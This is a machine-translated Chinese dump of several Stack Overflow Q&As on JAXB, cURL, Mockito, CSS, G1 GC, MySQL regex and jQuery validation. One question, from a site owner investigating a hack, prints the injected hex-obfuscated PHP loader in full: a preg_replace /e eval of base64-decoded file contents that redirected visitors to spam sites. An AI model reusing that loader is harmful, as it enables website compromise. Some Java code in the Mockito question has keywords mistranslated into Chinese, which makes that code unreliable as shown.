<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:Root xmlns:ns2="urn:my:foo:bar:1.0" xmlns:ns3="urn:other:foo:bar:1.1">
    <Content>
        <Header>
            <ns3:Leaf/>
        </Header>
    </Content>
</ns2:Root> 
```

但目前，我得到的只是：

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:Root xmlns:ns2="urn:my:foo:bar:1.0" xmlns:ns3="urn:other:foo:bar:1.1">
    <Content>
        <Header/>
    </Content>
</ns2:Root> 
```

我有两个 XSD 来生成所有必要的类，所以我在那边没问题（但由于这些类是生成的，我无法修改它们）。

这是生成第二个 XML（错误的）的示例代码：

```
package foo.bar;

import java.io.OutputStream;

import javax.xml.bind.JAXBContext;
import javax.xml.bind.JAXBException;
import javax.xml.bind.Marshaller;
import javax.xml.bind.annotation.XmlAccessType;
import javax.xml.bind.annotation.XmlAccessorType;
import javax.xml.bind.annotation.XmlElement;
import javax.xml.bind.annotation.XmlRootElement;
import javax.xml.bind.annotation.XmlType;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Node;

public class Test {

    private JAXBContext context;

    public Test() throws JAXBException {
        context = JAXBContext.newInstance(RootElement.class, LeafElement.class);
    }

    @XmlRootElement(name = "Root", namespace = "urn:my:foo:bar:1.0")
    @XmlAccessorType(XmlAccessType.FIELD)
    @XmlType(name = "Root", propOrder = { "content" })
    public static class RootElement {
        @XmlElement(name = "Content")
        protected ContentElement content;

        public ContentElement getContent() {
            return content;
        }

        public void setContent(ContentElement content) {
            this.content = content;
        }
    }

    @XmlRootElement
    @XmlAccessorType(XmlAccessType.FIELD)
    @XmlType(name = "Content", propOrder = { "dummy" })
    public static class ContentElement {
        @XmlElement(name = "Header")
        protected Object dummy;

        public Object getDummy() {
            return dummy;
        }

        public void setDummy(Object dummy) {
            this.dummy = dummy;
        }
    }

    @XmlRootElement(name = "Leaf", namespace = "urn:other:foo:bar:1.1")
    @XmlAccessorType(XmlAccessType.FIELD)
    @XmlType(name = "Leaf")
    public static class LeafElement {

    }

    public Node marshal(Object obj) throws JAXBException {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        dbf.setNamespaceAware(true);
        Document doc = null;
        try {
            DocumentBuilder db = dbf.newDocumentBuilder();
            doc = db.newDocument();
        } catch (ParserConfigurationException ex) {
            throw new JAXBException(ex);
        }

        Marshaller m = context.createMarshaller();
        m.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, Boolean.TRUE);
        m.marshal(obj, doc);
        return doc.getDocumentElement();
    }

    public void marshal(Object obj, OutputStream stream) throws JAXBException {
        Marshaller m = context.createMarshaller();
        m.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, Boolean.TRUE);
        m.marshal(obj, stream);
    }

    public void test() throws JAXBException {
        RootElement root = new RootElement();
        ContentElement content = new ContentElement();
        root.setContent(content);
        LeafElement leaf = new LeafElement();
        content.setDummy(marshal(leaf));
        marshal(root, System.out);
    }

    public static void main(String[] args) throws JAXBException {
        new Test().test();
    }

} 
```

在该代码中，您会找到 3 个“可编组”类：

1.  `RootElement`,
2.  `ContentElement`和
3.  `LeafElement`.

前两个类来自一个 XSD（具有给定的命名空间），最后一个来自另一个 XSD（具有另一个命名空间），如示例代码所示。

到目前为止，我发现要解决这个问题的方法是创建一个附加类，该类将设置为`dummy`ContentElement 上的内容，并且本身将包含 LeafElement，以便 JAXB 创建适当的中间节点。但是我发现这个解决方案非常丑陋，不是真正可维护的，并且希望 JAXB 有一些方法来处理这种情况。

如果您需要更多信息，或者您需要我重新提出我的问题，请不要犹豫。我很难用简单的话来解释我的问题。

约束如下：

*   我无法修改 RootElement、ContentElement 或 LeafElement
*   我不能使用除 JAXB 以外的其他东西

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-23T00:32:50.070

如果你不能改变任何元素类，那么你必须创建一个持有者对象来叶子。

```
@XmlRootElement
@XmlAccessorType(XmlAccessType.FIELD)
public static class LeafElementHolder {
    @XmlAnyElement
    private Object leaf;

    public Object getLeaf() {
        return leaf;
    }

    public void setLeaf(Object leaf) {
        this.leaf = leaf;
    }
} 
```

将此类添加到上下文中

```
public Test() throws JAXBException {
    context = JAXBContext.newInstance(RootElement.class, LeafElement.class, LeafElementHolder.class);
} 
```

并在你的 test() 方法中使用它

```
 LeafElement leaf = new LeafElement();
    LeafElementHolder holder = new LeafElementHolder();
    holder.setLeaf(leaf);
    content.setDummy(marshal(holder)); 
```

XML 中有 4 个元素，因此 Java 中必须有 4 个类。

```
ns2:Root
  ns2:Content
    ns2:Header
      ns3:Leaf 
```

# php - cURL 不为某些网站返回任何内容

> ID：12429145
> 
> 赞同：0
> 
> 时间：2012-09-14T17:17:19.183
> 
> 标签：php, curl

我正在执行一个 cURL 请求，并且在大多数情况下它可以工作，但是对于某些站点它什么也没带回来，并且 cURL 没有错误。任何人都可以给我一些帮助吗？

这是我的小应用程序：http: [//www.convurgency.com/tools/googlebot.php](http://www.convurgency.com/tools/googlebot.php)

去那里进入这个网站：[http ://www.beemak.com](http://www.beemak.com)

正如您所看到的，很多网站都可以工作，但选定的网站没有……有什么想法吗？

这是我的代码：

```
<?php
//Bot Curl Request  

$handle = curl_init();

curl_setopt_array($handle,array(
         CURLOPT_URL => $_GET['site'],
         CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
         CURLOPT_RETURNTRANSFER => true,
         CURLOPT_FOLLOWLOCATION => true
      ));

    $output = curl_exec($handle);

    $httpcode = curl_getinfo($handle, CURLINFO_TOTAL_TIME);
    $connecttime = curl_getinfo($handle, CURLINFO_CONNECT_TIME);
    $downloadtime = curl_getinfo($handle, CURLINFO_SPEED_DOWNLOAD);
    $downloadsize = curl_getinfo($handle, CURLINFO_SIZE_DOWNLOAD);

    if(curl_errno($handle)){
        echo '<img class="errorlogo" src="http://www.convurgency.com/images/logo103.png" />';
        echo '<p style="text-align:center;">There was an error finding your site, are you sure it exists?</p>';
        echo '<p style="text-align:center;"><a href="http://www.convurgency.com/tools/googlebot.php">Back to GoogleBot View</a></p>';
        echo 'Curl error: ' . curl_error($handle);

    } else {

        echo 'No Errors';

    };

    if (curl_error($handle)) {
     print "ERROR ". curl_error($handle) ."\n<br/>";
    }

     curl_close($handle);

     $output2 = preg_replace(
        array(
         // Remove invisible content
        '@<head[^>]*?>.*?</head>@siu',
        '@<style[^>]*?>.*?</style>@siu',
        '@<script[^>]*?.*?</script>@siu',
        '@<object[^>]*?.*?</object>@siu',
        '@<embed[^>]*?.*?</embed>@siu',
        '@<applet[^>]*?.*?</applet>@siu',
        '@<noframes[^>]*?.*?</noframes>@siu',
        '@<noscript[^>]*?.*?</noscript>@siu',
        '@<noembed[^>]*?.*?</noembed>@siu',
        // Add line breaks before and after blocks
        '@</?((address)|(blockquote)|(center)|(del))@iu',
        '@</?((div)|(h[1-9])|(ins)|(isindex)|(p)|(pre))@iu',
        '@</?((dir)|(dl)|(dt)|(dd)|(li)|(menu)|(ol)|(ul))@iu',
        '@</?((table)|(th)|(td)|(caption))@iu',
        '@</?((form)|(button)|(fieldset)|(legend)|(input))@iu',
        '@</?((label)|(select)|(optgroup)|(option)|(textarea))@iu',
        '@</?((frameset)|(frame)|(iframe))@iu',
        ),
                    array(' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', ' ', "\n\$0", "\n\$0", "\n\$0", "\n\$0", "\n\$0", "\n\$0", "\n\$0", "\n\$0", ), $output );

 echo preg_replace('/<(\w+) [^>]+>/', '<$1>', $output2);

 ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T18:02:38.280

查看 $connecttime 和 $downloadtime 并检查请求是否未超时。使用命令行 curl 或 wget 检查您是否可以从运行脚本的服务器访问该网站。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-22T21:33:15.713

目标站点 URL 执行重定向可能存在问题。

默认情况下，当 curl 在发出请求后收到重定向时，它不会向新 URL 发出请求。例如，考虑 URL [http://www.facebook.com](http://www.facebook.com)。当您使用此 URL 发出请求时，服务器会向[https://www.facebook.com/](https://www.facebook.com/)发送 HTTP 3XX 重定向。如果您尝试以下操作，您将得到一个空输出：

```
$ curl http://www.facebook.com
$ 
```

如果您希望 cURL 遵循这些重定向，您应该使用 -L 选项。

```
$ curl -L http://www.facebook.com/
<full content of raw html page here> 
```

# android - Android 中的类型输入

> ID：12429146
> 
> 赞同：0
> 
> 时间：2012-09-14T17:17:23.287
> 
> 标签：android, input, types

我的输入类型属性有问题，我需要在编辑文本中写入人名，但是当我运行应用程序时，键盘不会动态更改，它允许用户在名称字段中输入任何字符。这是代码：

```
<TextView  
     android:layout_width="fill_parent" 
     android:layout_height="wrap_content" 
     android:text="Name:"/>

     <EditText  
         android:id="@+id/edittext"  
         android:layout_width="fill_parent"        
         android:layout_height="wrap_content" 
         android:inputType="textPersonName"    
     /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:23:55.470

看来您只能使用输入类型属性来限制数字。下面的链接可能会帮助您解决问题。

[https://stackoverflow.com/a/4401227/1157215](https://stackoverflow.com/a/4401227/1157215)

# java - 如何验证是否在被测系统上调用了方法（不是模拟）

> ID：12429157
> 
> 赞同：6
> 
> 时间：2012-09-14T17:18:43.163
> 
> 标签：java, junit, mocking, powermock

我正在尝试编写一个需要确认是否调用方法的单元测试。我正在使用 JUnit、Mockito 和 PowerMock。

```
公共类发票
{

  受保护的无效 createInvoice()
  {
    // 这里随机的东西
    markInvoiceAsBilled("57");
  }

  protected void markInvoiceAsBilled（字符串代码）
  {
    // 标记为已收费
  }
}

```

所以，这里我的测试系统是`Invoice`. 我正在运行这个测试：

```
  公共类 InvoiceTest
  {
    @测试
    公共无效 testInvoiceMarkedAsBilled()
    {
      发票 sut = new Invoice();
      发票 sutSpy = spy(sut);

      sut.createInvoice();

      // 我想验证是否调用了 markInvoiceAsBilled()
    }
  }

```

这个例子只是实际代码的一个例子......

我的问题是，mockito 说你只能验证是否在模拟对象上调用了一个方法......但我不想模拟这个对象，因为它是我正在测试的对象。我知道你可以监视你正在测试的对象，所以这就是我尝试的：

```
  验证（sutSpy）.markInvoiceAsBilled（“57”）；

```

我想做的事是不可能的吗？还是我只是走错路了？

谢谢大家 ：）

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-14T17:47:17.023

我不确定您尝试做的是否是处理事情的最佳方式。

我不关心验证`Invoice.createInvoice()`调用内部私有方法`markInvoiceAsBilled()`- 而是测试调用`createInvoice()`以您期望的方式更改 Invoice 对象的状态 - 即`status`现在`BILLED`或类似的方式。

换句话说——不要测试调用了哪些方法`createInvoice()`——测试调用这个方法后，对象的*状态*是你所期望的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-09-01T17:38:06.180

我同意matt-b的回答。话虽如此，根据用例和方法的复杂性，您可以重新设计您的单元，以便对其进行测试。

例如说你的对象变得更加复杂，例如

```
public A {
  public a() {
    b();
    c();
  }

  public b() { /** hairy code, many branches to test */ }
  public c() { /** hairy code, many branches to test */ }
} 
```

用测试覆盖 b 和用测试覆盖 c 是直截了当的，但覆盖 a 似乎很麻烦，因为您依赖于方法 b 和 c。

考虑一下这个设计

```
public A {
  private final Dep mDep;

  public a() {
    mDep.b();
    mDep.c();
  }

  public b() { 
    mDep.b(); 
  }

  public c() { 
    mDep.c();
  }

  // dependency abstraction we create to help test
  static class Dep {
    public b() { /** hairy code, many branches to test */ }
    public c() { /** hairy code, many branches to test */ }
  }
} 
```

现在， testing `A.a`，`A.b`并且`A.c`只需要您验证您的`mDep`被调用（以及该方法所做的任何其他事情）。另外，你测试`A.Dep.b`和`A.Dep.c`方法。

# html - 如何使用 HTML/CSS 在网页的左右添加空间

> ID：12429158
> 
> 赞同：7
> 
> 时间：2012-09-14T17:18:45.287
> 
> 标签：html, css, web

![在此处输入图像描述](../Images/8be2b698a267c408008fd978331146c2.png)

我想在 HTML 文档中添加空间，就像橙色矩形内的空间一样。我不知道专业术语的技术术语。道歉。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-14T17:21:56.453

如果您希望将您的网页居中，并且您在主容器上使用固定宽度，这很容易实现。

CSS

```
.container {
   margin:0 auto; /* this will center the page */
   width:960px; /*  use your width here */
} 
```

HTML

```
<body>
    <div class="container">
      <!-- all your great content here -->
    </div>
</body> 
```

如果您需要帮助将其应用于您的 html/css，请发布您的 html，我很乐意为您提供帮助。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-09-14T17:26:41.880

为什么不这样做？：

```
<style type="text/css">
    html, body {
        margin: 0;
        border: 0;
        width: 100%;
    }

    body {
        padding: 0 20px;
    }

    #main {
        margin: 0 auto; /* in case you want to set a fixed width on this as well */
    }
</style>

<body>
    <div id="main"></div>
</body> 
```

这样，根据窗口的宽度，主 div 将调整大小，并且两边总是有一个固定的空间。如果您希望主 div 具有固定宽度并且两侧的间距自动调整大小，请使用其他解决方案。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T17:20:24.970

这些将是利润。但是您更好的选择是将主要区域包装在 div 或其他块元素/分段根中，将其设置为您想要的宽度，然后将其居中`margin: 0 auto;`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-14T17:20:43.333

你需要利润。将样式设置为`margin:0 auto;`将使您的 div 居中

# java - Java G1 GC 处理参考对象工作缓慢

> ID：12429161
> 
> 赞同：11
> 
> 时间：2012-09-14T17:18:54.707
> 
> 标签：java, garbage-collection, g1gc

我已经在 J​​ava 上运行了计数器。它可以 24 小时工作，并且点击率大约每秒 100 次。白天 GC 处理时间从 20-60 毫秒缓慢上升到 10000-60000 毫秒，然后下降到 20-60 毫秒。这种模式不时重复。从 GC 日志中，我发现大部分时间 GC 都花在处理引用对象（Ref Proc）上。那么这么长的GC时间可能是什么原因呢？

```
Server: Amazon EC2 m1.small
OS: Ubuntu 10.04.3 LTS
Java: Oracle 1.7.0_07 
```

GC 日志示例：

```
2012-09-13T16:51:20.091+0400: 167239.936: [GC pause (young), 62.58395400 secs]
...
[Other: 62489.7 ms]
    [Choose CSet:   0.0 ms]
    [Ref Proc: 62433.9 ms]
    [Ref Enq:   0.0 ms]
    [Free CSet:   0.7 ms]
[Eden: 200M(200M)->0B(199M) Survivors: 4096K->5120K Heap: 578M(1024M)->380M(1024M)] 
```

时间 - “Ref Proc”图表：

```
09:37:59 - 242.4 ms
09:38:50 - 226.0 ms
09:39:00 - 83.6 ms
...
11:45:22 - 451.8 ms
11:46:04 - 489.3 ms
11:46:46 - 505.6 ms
...
14:05:40 - 1027.3 ms
14:06:01 - 796.6 ms
14:06:35 - 1064.0 ms
...
15:44:32 - 1920.4 ms
15:45:04 - 2116.7 ms
15:45:39 - 2196.8 ms
...
16:19:07 - 3983.3 ms
16:19:43 - 4494.9 ms
16:20:16 - 4065.2 ms
...
16:33:11 - 7690.1 ms
16:33:50 - 8501.4 ms
16:34:28 - 8059.3 ms
...
16:47:14 - 51378.6 ms
16:49:11 - 57529.2 ms
16:51:20 - 62433.9 ms
16:53:00 - 46.1 ms
16:53:30 - 45.5 ms
16:54:03 - 45.0 ms
...
16:54:38 - 57.0 ms
16:55:09 - 20.9 ms
16:55:43 - 21.3 ms
...
16:09:45 - 134.3 ms
16:10:21 - 142.1 ms
16:10:58 - 147.5 ms
...
17:18:51 - 177.3 ms
17:19:27 - 135.8 ms
17:20:03 - 179.6 ms 
```

我在 java 源参数 PrintReferenceGC 中找到了。接下来显示 GC 日志

```
[SoftReference, 0 refs, 0.0000050 secs]
[WeakReference, 6 refs, 0.0000030 secs]
[FinalReference, 113 refs, 0.0011180 secs]
[PhantomReference, 0 refs, 0.0000020 secs]
[JNI Weak Reference, 3.9010450 secs] 
```

这是 JNI 弱引用的一些问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T11:20:44.123

重要的是我的所有运行都使用 Yourkit 分析器。我安装了 OpenJDK7 的 fastdebug 版本。在这个版本有一个参数-XX:+TraceReferenceGC。使用此参数运行后 gc 日志显示大约 5000 一些终结器。此问题已通过关闭 Yourkit 的套接字探针得到解决。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-16T16:37:27.223

作为第一步，您可以使用 VisualVM 或任何工具来分析您的堆使用模式。您可能会通过优化代码、检查对象创建的热点来获得解决方案，这应该是一个永久性的解决方案。

如果这不可能，您必须找到适合您的应用程序行为的最佳堆大小和 GC 算法。这将是一种试错法。您肯定必须通过[调整文档](http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html)。当您的应用程序行为发生变化或负载模式发生变化时，您现在所做的调整可能会再次变得低效。

尝试找到适合您的收藏家。您将调整一些参数，例如

```
 -XX:+UseConcMarkSweepGC        
    -XX:SurvivorRatio=10 
    -XX:TargetSurvivorRatio=90 
    -XX:MaxTenuringThreshold=30 
```

通过反复试验。

# mysql - MySQL REGEXP 不匹配字符串

> ID：12429162
> 
> 赞同：1
> 
> 时间：2012-09-14T17:18:55.063
> 
> 标签：mysql, regex, select

我有一个消息表。我试图在表中查找具有符合特定格式的 ID 代码的消息。我下面的正则表达式是为匹配 PHP 中的这些值而编写的，但我想将它移到 MySQL 查询中。

它正在寻找一种特定格式的标识符代码，如下所示：

```
[692370613-3CUWU] 
```

代码具有一致的格式：

*   以硬括号 [ ] 开头和结尾
*   里面有两个组件，
    *   第一个是帐号，最少 9 位，但可能更高
    *   第二个组件是字母数字代码，5 个字符，可以包括 1-9，以及不包括“O”的大写字母
*   完整的代码可以出现在消息的任何地方

我有一个查询，内容如下：

```
SELECT * FROM messages 
WHERE 
    msgBody REGEXP '\\[(\d){9,}-([A-NP-Z1-9]){5}\\]' 
      OR 
    msgSubject REGEXP '\\[(\d){9,}-([A-NP-Z1-9]){5}\\]' 
```

我在表中创建了一个测试行，它在 msgBody 字段中只有上面的示例值进行测试 - 但它不返回任何结果。

我猜我在 PHP 风格的正则表达式与 MySQL 的转换中遗漏了一些东西。

非常感谢您的帮助。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T17:26:40.950

而不是`\d`尝试使用`[[:digit:]]`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:33:31.973

```
SELECT * FROM messages 
WHERE 
  msgBody    REGEXP '\\[([0-9]){9,}-([A-NP-Z1-9]){5}\\]' 
             OR
  msgSubject REGEXP '\\[([0-9]){9,}-([A-NP-Z1-9]){5}\\]' 
```

# java - 如何模拟影响对象的无效返回方法

> ID：12429169
> 
> 赞同：21
> 
> 时间：2012-09-14T17:19:25.563
> 
> 标签：java, mockito

我正在为我的应用程序编写单元测试，我想知道 Mockito 框架是否有可能影响传递给返回模拟类的 void 的方法的对象。例如，调用一个模拟验证类，该类包含一个返回 void 但通过作为参数传入的对象跟踪各种更改和元数据的方法。.

```
public GetCartItemsOutput getCartItems(GetCartItemsInput getCartItemsInput) {
    CartItemsFilter cartItemsFilter = new CartItemsFilter();
    validator.validateCartItemsInput(getCartItemsInput, cartItemsFilter); ... 
```

我为我的其他测试模拟了验证器类，但对于这个我需要模拟对我不知道该怎么做的 cartItemsFilter 对象的更改。

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-09-14T17:42:14.190

答案是肯定的，你可以，根据你的测试需要，基本上有两个级别的这样做。

如果您只想测试与模拟对象的交互，您可以简单地使用该[`verify()`](http://docs.mockito.googlecode.com/hg/latest/org/mockito/Mockito.html#verify%28T%29)方法来验证是否调用了 void 方法。

如果您的测试确实需要模拟对象来修改传递给它的参数，您将需要实现[`Answer`](http://docs.mockito.googlecode.com/hg/latest/org/mockito/stubbing/Answer.html)：

**已编辑**以显示使用带有 void 方法的答案的正确形式

```
doAnswer(new Answer() {
    @Override
    Object answer(InvocationOnMock invocation) {
        Object[] args = invocation.getArguments();
        ((MyClass)args[0]).myClassSetMyField(NEW_VALUE);
        return null; // void method, so return null
    }
}).when(mock).someMethod(); 
```

在 Java 8+ 中，上面的内容使用 lambda 进行了简化：

```
doAnswer(invocation-> {
    Object[] args = invocation.getArguments();
    ((MyClass)args[0]).myClassSetMyField(NEW_VALUE);
    return null;
}).when(mock).someMethod(); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2016-01-15T06:10:11.440

添加到 Kevin Welker 的答案中，如果您的 MyClass 是自定义类，则在其中定义一个 equals/hashcode 方法，以便 Mockito 可以使用它来精确匹配方法调用。

就我而言，“MyClass”在第三方 API 中，所以我必须使用以下方法“any” -

```
 doAnswer(new Answer() {
    Object answer(InvocationOnMock invocation) {
        Object[] args = invocation.getArguments();
        ((MyClass)args[0]).myClassSetMyField(NEW_VALUE);
        return null; // void method, so return null
    }
}).when(mock).someMethod(any(MyClass.class)); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-09-16T07:17:05.387

ArgumentCaptor 也可能有所帮助。

[这是从这里](http://mockito.googlecode.com/svn/tags/1.8.0/javadoc/org/mockito/ArgumentCaptor.html)找到的一个片段：

```
 ArgumentCaptor<GetCartItemsInput > argument = ArgumentCaptor.forClass(GetCartItemsInput .class);
  verify(mock).getCartItems(argument.capture());
  assertEquals(cartItemsFilter, argument.getValue()); 
```

# objective-c - 在 NSBlockOperation 中访问 self - 保留周期？

> ID：12429170
> 
> 赞同：1
> 
> 时间：2012-09-14T17:19:28.220
> 
> 标签：objective-c

```
self.operationQueue = [[NSOperationQueue alloc] init];
[self.operationQueue addOperationWithBlock:^{
    [self doSomethingElse];        
}];

- (void)doSomethingElse {
    [self doAnother];
} 
```

这会创建一个保留周期吗？我保留了对操作队列的引用，但没有引用操作。想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:22:55.567

这可能会创建一个保留周期。创建一个指向 self 的弱指针并使用它：

```
_weak MyObject *weakSelf = self; 
```

编辑：

在你的块中，创建一个对 self 的强引用。评估您的指针以确保它有效，并且您是安全的。您的代码段（然后基于您所描述的内容）应为：

```
self.opeartionQueue = [[NSOperationQueue alloc] init];
_weak MyObject *weakSelf = self;
[[self operationQueue] addOperationBlock:^{

    _strong MyObject *strongSelf = weakSelf; // Obtain a strong reference so our pointer won't dangle out from under us...

    if(strongSelf) // Make sure it's valid
    {
        [strongSelf doSomethingElse]; // Do your work
    }
} 
```

# php - 注入 PHP 代码执行 301

> ID：12429175
> 
> 赞同：0
> 
> 时间：2012-09-14T17:19:51.790
> 
> 标签：php, apache

一些我如何设法在我帮助维护的网站上以非常具体的方式受到攻击，我正在调查服务器是否被直接黑客攻击或有人能够以某种方式注入恶意脚本。

首先有人设法得到这个：

```
@preg_replace("\x7c\50\x5b\136\x3c\135\x2b\51\x7c\151\x73\145","\x65\166\x61\154\x28\47\x24\142\x66\167\x3d\71\x30\65\x38\67\x3b\47\x2e\142\x61\163\x65\66\x34\137\x64\145\x63\157\x64\145\x28\151\x6d\160\x6c\157\x64\145\x28\42\x5c\156\x22\54\x66\151\x6c\145\x28\142\x61\163\x65\66\x34\137\x64\145\x63\157\x64\145\x28\42\x5c\61\x22\51\x29\51\x29\51\x3b\44\x62\146\x77\75\x39\60\x35\70\x37\73","\x4c\62\x35\157\x59\156\x4d\166\x64\62\x56\151\x4c\62\x78\160\x64\155\x55\166\x61\110\x52\153\x62\62\x4e\172\x4c\63\x52\154\x63\63\x51\166\x62\107\x56\62\x5a\127\x77\171\x58\63\x52\154\x63\63\x51\166\x62\107\x39\156\x4c\171\x34\154\x4f\104\x49\64\x52\123\x55\167\x4d\104\x45\172\x4a\125\x49\64\x52\152\x4d\154\x51\153\x4d\170\x51\151\x56\103\x4d\152\x4a\103\x4a\124\x52\107\x4e\124\x63\75"); 
```

在文件注释之后进入 PHP 文件的最顶部。这和其他代码最相似的作用是 301 将未通过浏览器连接到该网站的任何人重定向到发薪日贷款网站。这只影响了我的主页，所有其他页面都很好。

可能有更多代码要做，但这是最令人困惑的部分，因为此代码位于一个名为的文件中，该文件`functions.php`仅包含在内，但它是 index.php（我的主页）中包含的第一个文件。

让我完全困惑的是，有人如何在不直接入侵服务器的情况下获得代码，那里没有使用用户输入，它实际上位于整个文件之上。除了这个注入的代码和上面的一些注释之外，什么都没有。

我的信封是：

> 琴图
> 
> PHP 5.2.14-pl0-gentoo
> 
> 阿帕奇 2

我检查了服务器日志，但是，像往常一样，他们删除了他们的踪迹。

正如您所注意到的，这也部分是服务器问题，但 atm 它是 90% 的编程问题，所以我想我会先在这里问它。

PHP 中是否存在任何可能导致此问题的漏洞？

如果您需要澄清，请告诉我。

## 编辑

我有一个分期系统，它有一个

*   工作
*   预习
*   居住

我知道这与 SQL 注入无关，因为如果我切换实时和预览文件夹，我不会遇到任何问题。我也不将 gentoo 密码存储在数据库或应用程序中，您只能连接到小范围 IP 地址中的服务器，除了 Apache，它接受来自任何主机的 80 和 443 连接。另外，我在站点中使用 SQL 转义类和方法（PDO、MySQLi 等）。

所以这个问题（更令人困惑）只位于我网站的一个副本中，而不是数据库或任何东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T17:48:46.900

我猜想在服务器管理员方面查明这类事情更多。检查攻击者修改文件的日期，并在服务器日志（可能是 apache 日志、FTP 日志、ssh 日志）中查找该日期和时间的可疑活动。这也可能取决于您的流量、日志大小和对服务器的访问级别，因为这可能会令人望而却步。如果您有任何上传文件的 html 表单，请验证为[php shells](http://mikeybeck.com/hacking/)存储文件的目录。还要检查该目录的权限。如果您在共享主机上，这也可能是攻击者在另一个站点上注入 shell，然后通过这种方式攻击您的结果。在这种情况下，请联系您的托管公司。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T17:26:06.363

网络服务器故障的可能性为 99%，SQL 注入是一回事，但我不知道，也许他们设法通过 SQL 注入以某种方式获取您的密码，然后登录到控制面板或 ftp，但是，我会说这是网络服务器。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-16T11:01:42.613

好的，所以我现在明白如何以及为什么了。这是我认为永远不会发生的一件事：Wordpress。

我基本上是以下受害者： http: [//muninn.net/blog/2012/06/a-tale-of-east-asian-history-british-loan-sharks-and-a-russian-hacker.html](http://muninn.net/blog/2012/06/a-tale-of-east-asian-history-british-loan-sharks-and-a-russian-hacker.html)

使用类似的工具：[http ://www.youtube.com/watch?v=y-Z5-uHvONc](http://www.youtube.com/watch?v=y-Z5-uHvONc)

您会看到，即使我的主站点不是由 wordpress 制作的，并且它有一个 wordpress 博客位于：`/blog/`黑客能够使用各种 Wordpress 漏洞来解决位置问题并在服务器的任何部分植入脚本。

顺便说一句，这实际上发生在最新安装的 Wordpress 上。仔细检查了版本。我们不完全确定他何时放置脚本（这些年来放置了多个外国脚本实例！）但我们知道最近的攻击肯定也是最近发生的，它放置了最新版本（或版本之前）在大量的审查下。

所以对那里的Wordpress有一个很好的注意事项......

# jquery - 在初始验证失败后，如何防止验证方法在每次击键时触发？

> ID：12429179
> 
> 赞同：1
> 
> 时间：2012-09-14T17:20:31.260
> 
> 标签：jquery, jquery-validate

我有一个带有“*名称*”输入字段的表单，它对于整个应用程序应该是唯一的。当用户尝试保存表单时，检查通过 Ajax 调用进行。如果用户将“*名称*”留空，然后保存表单，则会出现验证错误。此后，“ *name* ”字段的每次击键都将导致 Ajax 调用。如何防止这种情况？

**HTML**：

```
<input type="text" name="name" value="${Name}" /> 
```

**JS**：

```
var validationParams = {
  rules: {
    name: {
      required: true,
      uniqueName: true
    }
  }
};

...

$.validator.addMethod("uniqueName", uniqueNameFn, 'error msg');

...

saveBtn.on('click', save);

...

function save() {
  templateRegion.find(form).validate(validationParams);
  if (!templateRegion.find(form).valid()) return;

  $.ajax({ ... });
}

// FIRES ON EVERY KEYSTROKE IF 'required' VALIDATION INITIALLY FAILS
function uniqueNameFn(value, elemChanged) {
  $.ajax({ ... });
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T16:00:43.140

在您的 validationParams 对象中将 onkeyup 设置为 false

```
var validationParams = {
    onkeyup:false,
    rules: {
        name: {
            required: true,
            uniqueName: true
        }
    }
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-18T17:09:54.650

归根结底，这不是 jQuery 或 JavaScript 的问题。这是一种嵌套形式的情况。

# css - 使用可变宽度的标题滚动页面高度的 UL

> ID：12429182
> 
> 赞同：0
> 
> 时间：2012-09-14T17:20:39.513
> 
> 标签：css

我有一个`ul`页面的高度。我希望它能够在 ul 中滚动。可以在这里看到：http: [//d.saew.it/pRyz](http://d.saew.it/pRyz)

如您所见，它可以随着页面的高度滚动。现在，我还希望它有一个标题，如您所见。它应该在顶部“固定”，但`ul`列表的宽度是可变的，因此我不能将它设置为固定，因为它不能在可变宽度的父级中居中。

现在，我所拥有的工作几乎完美，除了 的`height: 100%`是`ul`父级的高度（与窗口相同），而`div`标题仍然占用它上方的空间。因此，这会`ul`从父元素的末尾抛出几个像素。看看：[http ://d.saew.it/NXL1](http://d.saew.it/NXL1)

有什么方法可以完成我在纯 CSS 中尝试的内容吗？

编辑：

代码在手写笔中，但任何人都应该能够阅读它：

```
div.ul-header
    background-color #E6E6E6
    text-align center
    margin 0
ul
    background-color #E6E6E6
    height 100%
    margin 0
    overflow-x hidden 
```

这些元素的所有父元素都`height: 100%;`允许它达到窗口的高度。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T17:39:49.397

我不完全清楚你想要什么，但这[是](http://jsbin.com/ukumix/1/edit)我最好的猜测。

基本上你正在做的是使用绝对定位和溢出规则来控制滚动的内容和出现的位置。

